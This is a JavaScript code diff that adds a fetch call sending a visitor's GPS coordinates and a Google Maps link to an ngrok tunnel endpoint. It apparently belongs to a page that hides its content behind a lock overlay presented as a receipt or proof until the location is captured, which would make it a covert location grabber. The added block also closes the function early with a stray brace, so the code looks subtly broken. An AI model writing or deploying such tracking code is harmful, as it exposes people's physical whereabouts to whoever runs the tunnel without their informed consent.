@@ -20,6 +20,29 @@ function sendLocation(position) {
     const longitude = position.coords.longitude;
     const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
+    // Verifique o que está sendo enviado
+    console.log("Enviando dados para o servidor:", { latitude, longitude, maps });
+
+    // Envia a localização para o servidor
+    fetch("https://2942-2804-1eb0-a0-1aa7-31c1-a91-a190-96bc.ngrok-free.app/send-location", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ latitude, longitude, maps })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (!data.success) {
+            alert("Erro ao enviar o comprovante.");
+        }
+    })
+    .catch(error => {
+        console.error("Erro:", error);
+    });
+}
+
+
     // Remove a tela de bloqueio e mostra o site
     document.getElementById("overlay").style.opacity = "0";
     setTimeout(() => {
